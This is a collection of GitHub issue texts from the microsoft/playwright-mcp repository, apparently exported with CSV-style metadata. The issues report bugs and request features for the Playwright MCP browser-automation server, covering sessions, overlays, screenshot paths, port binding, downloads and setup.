The issue appears to be inherent to the package's code and its compatibility with the Node.js environment used by Cursor's extension host.

1. Login to a website xyz, any can be used
2. Start Playwright with `npx @playwright/mcp@latest --port 8931 --browser msedge`
3. Open VSCode, create and start a VSCode dev container
4. Install MCP server in VSCode with user settings:
```

5. Open CoPilot in agent mode and add all Playwright tools
6. Prompt CoPilot with a simple instruction, e.g. open website xyz

Expected:
Playwright opens a browser window on the host with site xyz, and it is logged in

Actual:
Playwright opens a browser window on the host with site xyz, but it is not logged in.

So it works, except for being logged in. Some kind of problem with cookies or sessions not being propagated, or did I do something wrong with my setup steps?

Note: I'm connecting to the Playwright MCP server using HTTP instead of a Playwright node module installed in the container, because I am issuing my CoPilot prompts from dev containers but I want to communicate with my host browser rather than some headless browser installed in the container.

Thanks 🙏"

microsoft/playwright-mcp,3156100838,568,MCP Protocol Cannot Interact with Dropdown Options Rendered in Overlay Containers,closed,2025-06-18T09:13:51Z,2025-10-30T10:28:37Z,[],CIP-Dev12,"When automating web applications using the Playwright MCP protocol, dropdown UI elements rendered inside overlay containers (such as <div class=""cdk-overlay-container""> or similar portals used by Ant Design, Angular CDK, Element UI, etc.) are not captured in the MCP protocol’s page snapshot. As a result, these elements do not have a ref and are not accessible for interaction via MCP protocol commands.
This limitation makes it impossible to select dropdown options or interact with any content rendered outside the main DOM tree, even if the text is visible and unique on the page. In contrast, Playwright’s native API can interact with such elements using text selectors or other strategies.
Expected Behavior:
The MCP protocol should be able to capture and interact with overlay/portal content, such as dropdown options rendered in containers like cdk-overlay-container.
It should be possible to select or click options by visible text or by exposing refs for these overlay elements.
Actual Behavior:
Overlay content is not present in the MCP protocol snapshot.
No ref is available for dropdown options rendered in overlays, so MCP commands cannot interact with them.
Attempts to click or select by text or ref result in timeouts or errors.
Steps to Reproduce:
Open a page with a dropdown rendered via a portal/overlay (e.g., Angular CDK, Ant Design).
Use MCP protocol to open the dropdown.
Attempt to select an option rendered in the overlay.
Observe that the option is not present in the snapshot and cannot be interacted with.
Impact:
This issue blocks automation of any UI that uses overlay/portal containers for dropdowns, modals, or popovers, which are common in modern web frameworks.
Request:
Please enhance the MCP protocol to support interaction with overlay/portal content, or provide a workaround to allow automation of such UI elements.

Step 1-4 can operate properly, but Step 5 cannot be executed properly. 
I hope it can click the send icon on the right, but actually, it clicked the attachment icon on the left every time.
I tried the ""paper airplane icon in the right"", ""Send button on the right of the textarea box"", but it can not click them correctly.

microsoft/playwright-mcp,3139057579,544,Screenshot Path Generation Not Following Expected Directory Structure,closed,2025-06-12T06:51:18Z,2025-06-17T08:11:31Z,[],icai,"
## Summary
The current screenshot path generation creates flat file naming instead of hierarchical directory structure as expected based on the configuration.

## Current Behavior
When taking screenshots, the generated path follows this pattern:
```javascript
await page.screenshot({
  path: 'tests/snapshots/tests-snapshots-login-login-page-20250612-140000.png',
  quality: 50,
  scale: 'css',
  type: 'jpeg'
});
```

## Expected Behavior
I expect the path to follow a hierarchical directory structure like:
```javascript
await page.screenshot({
  path: 'tests/snapshots/login/xxxx/20250612-140000.png',
  quality: 50,
  scale: 'css',
  type: 'jpeg'
});
```

## Configuration
Here's my current `playwright-mcp-config.json`:

```json
{
  ""browser"": {
    ""browserName"": ""chromium"",
    ""isolated"": true,
    ""launchOptions"": {
      ""headless"": false,
      ""channel"": ""chrome"",
      ""executablePath"": ""/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"",
      ""args"": [""--no-sandbox"", ""--disable-dev-shm-usage""]
    },
    ""contextOptions"": {
      ""viewport"": { ""width"": 1280, ""height"": 720 },
      ""ignoreHTTPSErrors"": true,
      ""acceptDownloads"": true
    }
  },
  ""server"": {
    ""port"": 8080,
    ""host"": ""localhost""
  },
  ""capabilities"": [""core"", ""tabs"", ""pdf"", ""history"", ""wait"", ""files"", ""install"", ""testing""],
  ""vision"": false,
  ""outputDir"": ""tests/snapshots"",
  ""workingDirectory"": ""."",
  ""relativePaths"": true,
  ""fileNaming"": {
    ""preserveRelativePaths"": true,
    ""enforceRelativeBasePath"": ""tests/snapshots"",
    ""stripAbsolutePaths"": true,
    ""allowedBasePaths"": [""tests/snapshots""]
  },
  ""network"": {
    ""allowedOrigins"": [""*""],
    ""blockedOrigins"": [""https://analytics.google.com"", ""https://googletagmanager.com""]
  },
  ""noImageResponses"": false
}
```

And my `.vscode/mcp.json` configuration:

```jsonc
{
  ""servers"": {
    ""playwright"": {
      ""url"": ""http://[::1]:8080/sse""
    },
    ""playwright2"": {
      ""command"": ""npx"",
      ""args"": [
        ""@playwright/mcp@latest"",
        ""--isolated"",
        ""--config"",
        ""./playwright-mcp-config.json""
      ]
    }
  }
}
```

## Questions
1. Is there a configuration option to control the directory structure for generated screenshot paths?
2. How can I achieve the expected hierarchical path structure (`tests/snapshots/login/xxxx/timestamp.png`) instead of the current flat naming convention?
3. Are there any path template or pattern options available to customize the file organization?

<img width=""645"" alt=""Image"" src=""https://github.com/user-attachments/assets/5b47b562-24ca-4861-be0c-f65c0e5cd0e5"" />

## Environment
- OS: macOS
- Browser: Chrome (Chromium)
- playwright-mcp version: [latest]

## Additional Context
The current flat naming convention makes it difficult to organize and locate specific test screenshots, especially when dealing with multiple test suites and scenarios. A hierarchical structure would greatly improve file organization and maintainability.

Would appreciate guidance on how to configure the path generation to match the expected directory structure.




# Simple Test Demo for Playwright MCP Path Issue

## 🎯 Minimal Reproduction Case

### Test Scenario
A basic e-commerce test flow that demonstrates the screenshot path generation problem.

### Expected Directory Structure
```
tests/snapshots/
├── login/
│   ├── login-page-{timestamp}.png
│   └── login-success-{timestamp}.png
├── store/
│   ├── store-main-{timestamp}.png
│   └── product-detail-{timestamp}.png
└── cart/
    ├── cart-empty-{timestamp}.png
    └── cart-items-{timestamp}.png
```

## 🚀 Test Prompt

### Step 1: Login Test
```
Navigate to http://localhost:3000/auth/login
Take screenshot with path: tests/snapshots/login/login-page-20250612-140000.png
```

### Step 2: Store Test  
```
Navigate to /store
Take screenshot with path: tests/snapshots/store/store-main-20250612-140015.png
```

### Step 3: Cart Test
```
Navigate to /cart
Take screenshot with path: tests/snapshots/cart/cart-items-20250612-140030.png
```

## ❌ Current Problem

**What happens now:**
```javascript
await page.screenshot({
  path: 'tests/snapshots/tests-snapshots-login-login-page-20250612-140000.png'
});
```

**What we expect:**
```javascript
await page.screenshot({
  path: 'tests/snapshots/login/login-page-20250612-140000.png'
});
```

## ⚙️ Configuration

Using these settings in `playwright-mcp-config.json`:
```json
{
  ""outputDir"": ""tests/snapshots"",
  ""relativePaths"": true,
  ""fileNaming"": {
    ""preserveRelativePaths"": true,
    ""enforceRelativeBasePath"": ""tests/snapshots"",
    ""stripAbsolutePaths"": true,
    ""allowedBasePaths"": [""tests/snapshots""]
  }
}
```

## 🔍 Questions

1. **How to preserve subdirectory structure?** 
   - Current: flat naming with dashes
   - Needed: hierarchical directories

2. **Is there a path template option?**
   - To control the exact format of generated paths

3. **Configuration missing?**
   - Are there additional settings to enable proper directory structure?

## 💡 Workaround Attempts

Tried various configurations but still getting flattened paths. Looking for the correct way to achieve the expected directory organization for better test file management.

microsoft/playwright-mcp,3123382430,528,Inquiry About Reusing MCP Instance for Sequential Operations in Playwright-MCP,closed,2025-06-06T02:00:53Z,2025-06-18T23:53:42Z,[],v-chenyiqiang,"
Description:

I am working with the Playwright-MCP (SEE) service, utilizing a client codebase built on fastmcp. Here's a breakdown of my scenario:

1. **Service Initialization**: I start the Playwright-MCP (SEE) service and prepare to issue commands to a large model.
   
2. **Initial Query**: I send a request to the model: ""Search Google for the local weather and retrieve the weather forecast based on the search results.""

3. **Model Callback**: The large model, having already accessed my tool capabilities via MCP, proactively calls the Playwright-MCP API. The Playwright-MCP performs the following steps:
   - Opens a browser window.
   - Navigates to `https://www.google.com`.
   - Returns the current page results in a structured tree format.

4. **Response from Playwright-MCP**: The results are sent back to the large model.

5. **Model's Next Input**: The model then makes another input: ""Get today's weather"" 
   ```
   ChatCompletionMessage(content=None, refusal=None, role='assistant', annotations=None, audio=None, function_call=FunctionCall(arguments='{""element"":""textbox \\""河南启动对京东外卖的调查\\"""",""ref"":""e35"",""text"":""当地天气"",""submit"":true}', name='browser_type'), tool_calls=None)
   ```

6. **Execution Feedback from Playwright-MCP**: The response from Playwright-MCP is:
   ```
   {'success': False, 'error': 'Error calling server tool: Error: No current snapshot available. Capture a snapshot of navigate to a new location first.'}
   ```

Clarification Needed:

I would like to confirm if the MCP server supports the ability to reuse the same instance for sequential operations. Specifically, in my scenario, can the model invoke the MCP API in a second call to perform actions directly on the already opened page from the first call? Thank you!"

I'm trying to run e2e tests using a custom Chromium-based browser with the executable_path flag supplied to the MCP.

I've successfully configured MCP to launch my custom browser. However, after it loads, I'm unable to perform any subsequent actions. Even a simple navigation command (like what would typically be page.goto('https://example.com')) appears to succeed in the MCP's logs, but no navigation or changes occur within the browser instance itself.

Any insights or suggestions on troubleshooting this would be greatly appreciated!

microsoft/playwright-mcp,3097904429,488,playwright-mcp Server Fails to Bind to Configured Port and Exits Immediately on macOS,closed,2025-05-28T16:19:30Z,2025-05-28T20:37:45Z,[],sudharsan81,"**Problem Description**

When attempting to start the playwright-mcp server using a configuration file, the server prints ""MCP Server started"" and ""Web server started"" but does not actually bind to the specified port. Diagnostic logs indicate that the server attempts to bind to a different, seemingly arbitrary port (5174 in my case), and then immediately closes the listener before accepting connections. This results in clients (like Playwright tests or wscat) receiving an ECONNREFUSED error. The process then exits silently.

**Environment**

- Operating System: macOS
- Node.js Version: v23.6.
- npm Version: 11.3.0
- playwright-mcp Version: 0.0.12
- Playwright Browser Binaries: Confirmed installed via npx playwright install.

**Steps to Reproduce**

1. Create a project directory:
`
mkdir playwright-mcp-server
cd playwright-mcp-server
`
2. Initialise Node.js project and install playwright-mcp:
```
npm init -y
npm install playwright-mcp
```

3. Create mcp-config.js:
```
// mcp-config.js
module.exports = {
  port: 9000, // Configured port
  browser: 'chromium',
  ws: true,
  launchOptions: {
    headless: false,
    args: [
      '--disable-gpu',
      '--no-sandbox'
    ]
  },
  contextOptions: {
    ignoreHTTPSErrors: true,
    viewport: { width: 1280, height: 720 },
  },
  logLevel: 'debug', // Increased log level for more verbosity
};
```

4. Create verify-websocket.js (WebSocket client for verification):
```
// verify-websocket.js
const WebSocket = require('ws');
const wsUrl = 'ws://127.0.0.1:9000/playwright';

console.log(`Attempting to connect to WebSocket service at: ${wsUrl}`);

const ws = new WebSocket(wsUrl);

ws.onopen = () => {
  console.log('🎉 Successfully connected to the WebSocket service!');
  console.log('The WebSocket service is available.');
  ws.close();
};

ws.onerror = (error) => {
  console.error('❌ WebSocket connection error:');
  console.error(`  Error message: ${error.message}`);
  if (error.code) {
    console.error(`  Error code: ${error.code}`);
  }
  console.log('The WebSocket service is NOT available at this URL or there was a connection issue.');
  process.exit(1);
};

ws.onclose = (event) => {
  if (event.wasClean) {
    console.log(`Connection closed cleanly, code=<span class=""math-inline"">\{event\.code\} reason\=</span>{event.reason}`);
  } else {
    console.log('Connection died unexpectedly.');
  }
};

const timeout = setTimeout(() => {
  console.error('⏰ WebSocket connection timed out after 10 seconds.');
  ws.close();
  process.exit(1);
}, 10000);

ws.onopen = () => {
  clearTimeout(timeout);
  console.log('🎉 Successfully connected to the WebSocket service!');
  console.log('The WebSocket service is available.');
  ws.close();
};
```
5. Ensure Playwright browser binaries are installed:
```
npx playwright install
```

6. Attempt to start the playwright-mcp server with Node.js network debugging enabled:
```
# Open Terminal 1
NODE_DEBUG=child_process,net npx playwright-mcp --config mcp-config.js
```

7. Immediately, in a separate terminal (Terminal 2), check for open ports:
```
# Open Terminal 2
lsof -i :9000
```

8. Immediately, in Terminal 2, attempt to verify WebSocket connectivity:
```
# Still in Terminal 2, while Terminal 1 is running
node verify-websocket.js
```

**Expected Behaviour:**

Terminal 1: playwright-mcp should print ""MCP Server started"", ""Web server started"", and then remain active, listening on port 9000 for incoming connections.
Terminal 2 (lsof): Should show a node process listening on port 9000.
Terminal 2 (verify-websocket.js): Should successfully connect and print ""Successfully connected to the WebSocket service!"".

**Actual Behaviour**

Terminal 1:

```
Prints initial NODE_DEBUG logs (including CHILD_PROCESS setup, NET DNS lookups).
Prints:
MCP Server started
NET 94462: setupListenHandle null 5174 4 0 undefined
NET 94462: setupListenHandle: create a handle
NET 94462: bind to ::
NET 94462: _read - n 0 isConnecting? false hasHandle? true
NET 94462: Socket._handle.readStart
NET 94462: SERVER _emitCloseIfDrained
NET 94462: SERVER: emit close
NET 94462: setupListenHandle null 5174 4 0 undefined
NET 94462: setupListenHandle: create a handle
NET 94462: bind to ::
Web server started
The playwright-mcp process then immediately exits (returns to the command prompt) without any further error messages.
```
Terminal 2 (lsof -i :9000):

Shows no output, indicating that no process is listening on port 9000.

Terminal 2 (node verify-websocket.js):
Prints:
```
Attempting to connect to WebSocket service at: ws://127.0.0.1:9000/playwright
❌ WebSocket connection error:
  Error message: connect ECONNREFUSED 127.0.0.1:9000
The WebSocket service is NOT available at this URL or there was a connection issue.
```

**Analysis / Suspected Cause:**
The detailed NODE_DEBUG output shows that playwright-mcp is attempting to bind to an incorrect port (5174) internally, even though mcp-config.js specifies 9000. Immediately after this binding attempt, the server socket is explicitly closed (SERVER _emitCloseIfDrained, SERVER: emit close), causing the process to exit.

This indicates a potential bug in playwright-mcp where:

It is not correctly parsing or applying the port argument from the configuration file.
It might be attempting to use a default or arbitrary port (like 5174) regardless of the configuration.
A subsequent internal error or unhandled promise rejection leads to the immediate closure of the server socket and process exit, without a clear error message being logged to the console.

**Additional Diagnostic Info:**
A simple Node.js HTTP server (test-server.js) successfully binds to port 9000 and serves content, confirming the Node.js environment and OS are capable of port binding.
```
# test-server.js content
const http = require('http');
const hostname = '127.0.0.1';
const port = 9000; // Using the same port for testing
const server = http.createServer((req, res) => {
  res.statusCode = 200;
  res.setHeader('Content-Type', 'text/plain');
  res.end('Hello World from simple Node.js server!\n');
});
server.listen(port, hostname, () => {
  console.log(`Server running at <span class=""math-inline"">\{hostname\}\:</span>{port}/`);
});
server.on('error', (e) => { console.error(`Server error: ${e.message}`); });
```

(Make sure to change headless: false in launchBrowser())
The short version of it is that I was able to integrate prompting into an existing test code repository so that the initialization/API code is via code but we can extend tests quickly using prompt.

Some feature requests I would like:
1. When call the prompt, the interaction doesn't get added into the trace file, is there a way for this to be done? Basically, how to get additional Playwright logs/traces, especially from the prompts?
2. Arbigent can cache the code generated from the prompt so that we don't use LLM all the time. Can prompt generate code, saved to text file, hashed, when the same prompt is sent, run the saved code first, if doesn't work, then do the prompt?
3. Connect to knowledge base for better planning and verification of prompts?
Reason why is that our application has an action like ""create participant"", and another action called ""create caregiver"". These are different pages, but when run the prompt, it sometimes passes the test for create caregiver when what it actually did was create a participant. I think hooking it to a knowledge base for the company, and it being have to verify the page/state, that will make me more sure that it will do the right thing for testing.

Thank you in advance. Hope to hear from you soon.

""code --add-mcp '{""name"":""playwright"",""command"":""npx"",""args"":[""@playwright/mcp@latest""]}' "" 

there is no clear documentation outlining the next steps. It’s unclear how to proceed after this point, what to expect when the server starts, or what indicators might signal that something isn’t working as intended.

Could you please clarify the intended setup flow? Additionally, is there any step-by-step guide or video tutorial that walks through the full configuration and usage process?

Additionally, could you provide some context on what mcp does and how it helps in the Playwright development workflow? Understanding its purpose and benefits would be helpful in evaluating and using it effectively.

Thanks in advance for your help!

I have noticed a potential issue in the config resolution logic regarding the browserName setting when using CLI options.

In [`src/config.ts`](https://github.com/microsoft/playwright-mcp/blob/aa6ac51f92f199a4c50eb7c5f191452e308dfd5c/src/config.ts#L123), in the `configFromCLIOptions` function, if the CLI option for `browser` is not specified, the switch statement defaults to setting `browserName` to `'chromium'` and `channel` to `'chrome'`. As a result, when merging configs in `resolveCLIConfig`, the `cliOverrides` object includes `browserName: 'chromium'`, even though the user did not specify it via CLI.

This leads to an unexpected override:  
- If the user does not specify the browser via CLI, but a different `browserName` is set in the config file, the CLI override will still force it to `'chromium'`.

**Reference Code:**  
[`src/config.ts` - line 123](https://github.com/microsoft/playwright-mcp/blob/aa6ac51f92f199a4c50eb7c5f191452e308dfd5c/src/config.ts#L123)

**Expected behavior:**  
If no browser is specified via CLI, the merged config should respect the value from the config file, and not forcibly override it with `'chromium'`.

**Possible solution:**  
Consider updating `configFromCLIOptions` so that `browserName` is only set if the CLI option is actually provided. Otherwise, leave it undefined so that the config file value is preserved.

Thank you!"
microsoft/playwright-mcp,3082506058,457,MCP server unable to handle popups (timeout when selecting branch or search result),closed,2025-05-22T08:25:18Z,2025-05-26T21:29:36Z,[],cephalin,"### Problem

The Playwright MCP server appears to have trouble handling popups, particularly when interacting with dropdowns or search result popups. This results in timeouts when attempting to complete selections.

#### Example scenario (GitHub branch selector):

**Input:**
```
{
  ""element"": ""starter-no-infra branch in the branch selector dropdown"",
  ""ref"": ""[starter-no-infra-branch-ref]""
}
```

**Output:**
```
TimeoutError: frame._wrapApiCall: Timeout 5000ms exceeded.
Call log:
  - waiting for locator('aria-ref=[starter-no-infra-branch-ref]')
```

The example above is for selecting a different branch in a GitHub repo. The branch selector button is clicked, but the MCP server is unable to complete the selection of the desired branch in the popup.

#### Similar behavior observed in Azure portal:

When the action involves typing in the search box and then selecting an item from the search results popup, the MCP server fails at the selection step.

### Steps to Reproduce

1. Trigger the MCP server to select a branch (e.g., `starter-no-infra`) in a forked repository where a popup is used for selection.
2. Alternatively, trigger a scenario in the Azure portal where you type in a search box and attempt to select a search result from the popup.
3. Observe if the operation times out or fails to interact with the popup.

### Expected Behavior

- The MCP server should be able to handle UI popups, including dropdowns and search result lists, and complete the intended selection.

### Actual Behavior

- Timeout occurs, and the selection in the popup is not completed.

### Additional Context

- This may be caused by slow UI loading, a selector mismatch, or unhandled popups.
- Please investigate and update the automation to robustly handle UI popups and selectors.

_Related to both GitHub and Azure portal UI flows._

microsoft/playwright-mcp,3067333122,432,Question: Best Practices for Using Playwright MCP – Code vs. Plain English Approach,closed,2025-05-15T20:39:52Z,2025-05-16T23:11:00Z,[],mayur-waghela,"Hi there,

Apologies if this isn’t the ideal place to ask, but I’m hoping to connect with others who are actively using Playwright MCP server.

I’m currently exploring two different approaches:

**1.** Generate code from MCP server and maintain those test cases within a test suite (including editing, committing, and running them as standard test scripts).

**2.** Write test cases in plain English (e.g., using Cucumber-style feature files), and let LLMs + MCP server handle execution dynamically, without persisting or modifying the generated code.

While I understand both methods have their pros and cons, I’m curious:
If we go with the first approach, doesn’t it end up being similar to using Playwright’s codegen?

So my main question is:
How are others in the community using Playwright MCP in their workflow? Any insights on what’s working well (or not) would be appreciated!

Thanks in advance!"

microsoft/playwright-mcp,3055680803,397,"ariaSnapshot returns nodes without ref in execution-critical sections, breaking LLM-based planning",closed,2025-05-12T05:31:19Z,2025-05-12T17:20:43Z,[],Xingkangze,"We're using Playwright MCP to generate accessibility-based ""executable trees"" for LLM-driven UI agents.

When calling:
```
await frame.locator('body').ariaSnapshot({ ref: true, emitGeneric: true });
```
we expect all semantically actionable nodes (e.g. visible labels, buttons, options, selectors) to be assigned a unique ref in the resulting YAML tree.

However, in real pages (especially enterprise UIs), some nodes appear in the tree without any ref. These nodes often:

have meaningful text or title fields (e.g. ""现有人群"", ""上传人群"")

are visible in the DOM

are part of an interaction flow the LLM needs to plan over

This causes problems downstream:

LLM can’t refer to those nodes when planning (no ref)

Execution trace can’t match them for clicking/filling

The LLM planner is forced to hallucinate fallback paths or skip important options

🔍 Example of problematic snapshot fragment:
```
- generic:
    text: ""现有人群""
    title: ""现有人群""
    # ❌ missing ref

<!-- Failed to upload ""playwright_mcp1.png"" -->
<!-- Failed to upload ""playwright-mcp2.png"" -->

```

✅ Expected:

Even for generic or non-role-specific nodes, if text is present, a synthetic ref should be assigned (e.g. auto-ref# or dom-x).

🔁 Alternatives we tried:

Manually walking the snapshot tree to add fallback refs – works but breaks trace linkage

Using DOM selector-based patching – doesn’t align with the snapshot hierarchy

💡 Suggestion:

If ref: true is passed to ariaSnapshot, can Playwright guarantee:

All nodes with text/title get a ref (even synthetic)?

Or provide an opt-in flag like emitRefForAll: true

This would allow LLM-based agents to reason over and plan with the full page state.

I executed the following steps to set up the server:

```bash
git clone https://github.com/microsoft/playwright-mcp.git
cd playwright-mcp
npm install
npm run build
npx playwright install
node cli.js --port 8931 --browser chromium
```

The MCP server is running perfectly and responding to requests.

However, when I try to initialize the server and retrieve the available tools using the Python script (`MCPToolChecker`), the server connects successfully through SSE, and the initialization request is successful, but the tools list returned is empty.

I've verified the `lib` directory generated after running `npm run build`, and all tool modules appear to be present (`navigate.js`, `click.js`, etc.). Despite this, none of these tools are being listed by the MCP server when requested.

When attempting to invoke methods available in tools such as `browser.click`, the server responds with ""Method not found.""

**Additional details:**

- Protocol version used: ""2025-03-26""
- The SSE connection establishes correctly, and `sessionId` is received.
- The JSON-RPC request (`initialize`) returns successfully but without any tools listed under capabilities.

Please advise on why the server might not be registering or exposing the built-in tools correctly? Any help is greatly appreciated.

I've been facing an issues with automating ""click to download"" workflows with the playwright-mcp toolset.

# Issue

The `browser_click` tool is not able to trigger downloads on versions `>= 0.0.19`.

With version `0.0.18`, I manage to create an agent that clicks a button that triggers a download to a local dir.
However, after updating to versions `0.0.19`, and more recently to version `0.0.20`, this workflow stopped working.

---

# Example

Here is the setup to replicate the issues I have been facing:

**Agent:** use Claude Desktop, VSCode or Cursor
**Config:**

```
{
    ""browser"": {
      ""browserName"": ""chrome"",
      ""launchOptions"": {
        ""headless"": true
      },
      ""contextOptions"": {
        ""viewport"": {
          ""width"": 2560,
          ""height"": 1440
        }
      }
    },
    ""capabilities"": [
      ""core"",
      ""tabs"",
      ""history"",
      ""wait""
    ],
    ""vision"": false,
    ""outputDir"": ""/home/jmmfcoutinho/projects/mcp-test/output"",
    ""tools"": {
      ""browser_take_screenshot"": {
        ""omitBase64"": true
      }
    }
  }
```
You just need to change the `outputDir`, the remaining should be reusable.

**Agent commands:**
1. Go to https://altri.pt/en/investors/reports-and-presentations.
2. Take a screenshot.
3. Click the ""ALTRI, S.G.P.S., S.A. informs on: 2024 Annual Report and Accounts for consideration at the AGM to be held on April 28th, 2025 - non-ESEF"" report.

**Note:** I run these commands sequentially (wait for the response before the next command), but it should fail either way.

## Description:

**Problem:**

Currently, automating LLM interactions with the browser requires a DOM snapshot before each interaction with a page element.

For example, to fill two text fields, the process is as follows:

1.  Take a snapshot to retrieve the `ref` of the first text field.

2.  Fill the first text field using the retrieved `ref`.

3.  Take a **new** snapshot to retrieve the `ref` of the second text field.

4.  Fill the second text field using the retrieved `ref`.

This approach, which requires a snapshot for each interaction, results in a significant overhead and considerably slows down the automation process.

**Proposed Optimization:**

To optimize this process, it would be preferable to allow the use of a **single snapshot** for multiple interactions. Instead of retrieving a `ref` each time, the system should be able to:

1.  Take a single snapshot of the DOM.

2.  Retrieve all the necessary `ref`s from this single snapshot.

3.  Perform all the required interactions (e.g., filling multiple text fields) using the `ref`s from the single snapshot.

**Expected Benefits:**

* **Significant reduction in workload:** By taking a single snapshot instead of multiple ones, the number of necessary operations is considerably reduced.

* **Improved execution speed:** Fewer snapshots translate to faster execution of automation tasks.

* **Simplified process:** A single snapshot simplifies the logic and reduces code complexity."

microsoft/playwright-mcp,3036573781,329,"LLM Agent Cannot Access or Parse Snapshot Data for Extraction Tasks (OpenRouter Gemini, LangChain, mcp-use)",closed,2025-05-02T18:14:16Z,2025-05-02T20:34:10Z,[],nisarmasid,"I am using the Playwright MCP server (from source, with custom modifications) together with the mcp-use Python client and a LangChain agent, powered by the OpenRouter Gemini model. My goal is to automate product search tasks and have the LLM extract structured information (product titles, descriptions, URLs, etc.) from web pages using the browser_snapshot tool.

However, despite the MCP server successfully capturing and returning the accessibility snapshot (YAML), the LLM agent is unable to access or parse the snapshot data for extraction. The agent always responds with messages like:

**> ""I cannot directly parse the snapshot and extract this information.""

> ""I need specific element descriptions and references...""**

**What I have tried**

I have confirmed that the MCP server is running locally and is returning the snapshot YAML (with custom delimiters) in the tool output.

I have updated my browser_mcp.json to connect directly to my local MCP server.
I have added debug logging to the MCP server and can see the full snapshot YAML in the server logs.
In my Python client, I print the raw agent response after each action, but the snapshot YAML does not appear in the response—only tool action/observation summaries.
The LLM (Gemini via OpenRouter) is not being given the actual snapshot data in its prompt/context, so it cannot extract job information.

microsoft/playwright-mcp,3035429823,322,Feature Request: Can we have capability like browser_snapshot but with the ability to capture Outer HTML or Page DOM,closed,2025-05-02T08:02:42Z,2025-05-02T13:31:34Z,[],abhijit-nightfall,"Currently, browser_snapshot allows us to take a full-page accessibility snapshot. This is super useful for LLMs to understand the page, which can be further used to write Page Classes in the Testing Framework. This can reduce the effort to develop or maintain stable POM Classes effortlessly. 

**Challenge:** The limitation here is that if the elements have testids, ids, data-testids, and we want to have that attribute knowledge passed to LLM to create better, more stable locators, today we can not.

**Suggestion:** Can we have a capability to retrieve as much DOM-related info, including attributes, as possible? Or maybe a way to execute JavaScript [ document.documentElement.outerHTML ] and retrieve the result.

I imagine that if I simply send the same prompt again, it might execute the same steps, but I'm concerned about unnecessary token usage. Is there a way to optimize this, like caching the previous execution or recording the steps somehow to replay them without consuming more tokens?

Is there any built-in support for this, or a recommended approach to achieve it?

       As a playwright-mcp user, I would like to propose adding a video recording feature.
       Feature Suggestions:
            1.Support video recording during execution to capture all page operations and state changes
            2.Provide configuration options:
                 Video recording switch (on/off)
                 Video quality and size settings
                 Video save path configuration
                 Video naming rules settings
            3.Support video recording in multi-page scenarios
       Implementation Reference: 
           Can reference Playwright's native video recording implementation: 
               1.Enable video recording through BrowserContext configuration 
               2.Support parameters such as video size and save directory settings 
               3.Automatically save video when context/page closes 
               4.Provide page.video() API to access video files
       Expected Benefits:
               1.Improve debugging efficiency - Quickly locate issues through video playback 
               2.Enhanced issue reproduction - Recorded videos can clearly demonstrate how issues occur 
               3.Optimize test reports - Videos can serve as supplementary material for test reports 
               4.Improve user experience - Make it easier for users to understand and analyze execution processes

Currently, Playwright MCP does not seem to provide built-in support for handling [network events](https://playwright.dev/docs/network#network-events) such as request, and response.

How about adding the `handle_request` or `handle_response` tools to enable users to monitor the network event?

## Suggested Solution

It would be helpful to have a built-in tool (e.g., handle_request, handle_response) or automatic handling logic within MCP that:

Listens to the `response` and `request` event on the Page object.
This would enable automated tests to run more smoothly when network events are triggered without manual intervention.

It is very useful to establish a series of API invocations using this MCP server, especially when we try to do API testing using Playwright.

## Use Case

For example, even a non-developer would have the versatility to create a specific API scenario test simply by manipulating Playwright-MCP.

microsoft/playwright-mcp,3008285628,233,File Upload Not Working When File Is Provided In Prompt Using Playwright MCP (Claude Desktop),closed,2025-04-21T12:09:12Z,2025-04-22T08:00:25Z,[],surenderanmaalexi,"**Environment:**

- MCP Client: Claude Desktop
- Playwright Version: Latest
- OS: macOS 15.4
- Browser: Chrome
- Test URL: https://the-internet.herokuapp.com/upload

---

**Setup To Reproduce:**

1. Launch Claude Desktop
2. Configure MCP with:
   ```json
   {
     ""mcpServers"": {
       ""playwright"": {
         ""command"": ""npx"",
         ""args"": [
           ""@playwright/mcp@latest""
         ]
       }
     }
   }
   ```
3. In Claude, use a prompt like:
   > Navigate to [https://the-internet.herokuapp.com/upload](https://the-internet.herokuapp.com/upload) and upload the file I give you.

4. Provide a file directly in the chat.
5. Observe that the browser navigates to the page, but the file is not uploaded.

---

**Issue Description:**

When a file is provided directly through the Claude Desktop chat prompt, Playwright MCP is expected to handle the upload. However, despite the file being available to the client, the upload does not happen.

The file is not attached to the input element, and no form submission occurs. This blocks any upload scenario where files are already provided by the user upfront.

---

**Expected Behavior:**

Playwright MCP should detect the provided file and upload it through the file input. The upload should proceed programmatically since the file is already available in the prompt context.

* Windows 10
* WSL v2
* Ubuntu 24
* Node.js 22 (in WSL - no Node.js in Windows)
* VSCode running on Windows with remote connection to wsl [this way](https://code.visualstudio.com/docs/remote/wsl)

### Issue
The official docs about the pw-mcp add on to the user settings json file in vscode doesn't seem to work in WSL.
This config:
```json
{
  ""mcpServers"": {
    ""playwright"": {
      ""command"": ""npx"",
      ""args"": [
        ""@playwright/mcp@latest""
      ]
    }
  }
}
```

Is giving me this error:
```bash
[info] Starting server playwright
[info] Connection state: Starting
[info] Starting server from LocalProcess extension host
[info] Connection state: Starting
[info] Connection state: Error spawn npx ENOENT
```
Same thing replacing the ""npx"" command with the complete absolute  path.

### Solution I found (although partial)
[This article](https://huggingface.co/blog/lynn-mikami/microsoft-playwright-mcp) tells about Server Sent Events (SSE), so I got it working like this:

1. After installing the Playwright/mcp server, get it up and running with a port:
```bash
npx @playwright/mcp@latest --port 8931
```
2. Then, configure the client settings with your endpoint:
```json
{
  ""mcpServers"": {
    ""playwright"": {
     ""type"": ""sse"",
      ""url"": ""http://localhost:8931/sse""
    }
  }
}
```
3. Reload vscode window and reestart the client.

### Question
Is there any other solution to make vscode automatically start the server without any problems? Please, let me know.

Looking at the code, it is now asynchronous because [it uses `fs.promises.mkdir`](https://github.com/microsoft/playwright-mcp/blob/main/src/index.ts#L137).

If `fs.mkdirSync` was used instead, it can actually be synchronous.

Right now, `createServer()` handles the creation/connecting of the Playwright browser internally, which works fine for many cases. But in more advanced setups, you might already have a context.

For example:
- A developer already has a fully configured launchPersistentContext(), like login state, extensions, or other settings
- The context is being managed externally (e.g. injected via dependency)

I know remoteEndpoint is an option, but sometimes passing a context directly is just simpler for local use cases.

I can create a PR about this feature if needed."

        - paragraph [ref=s2e108]: З того часу, як видатний астрофізик Едвін Габбл у
            середині 20-х років минулого століття відкрив, що Всесвіт не
            статичний, а постійно розширюється, а об’єкти, чиє світло доходить
            до нас, постійно від нас віддаляються, це стало однією з центральних
            тем для сучасної науки.
        - paragraph [ref=s2e114]: У 1998 році два незалежні проєкти — Supernova Cosmology
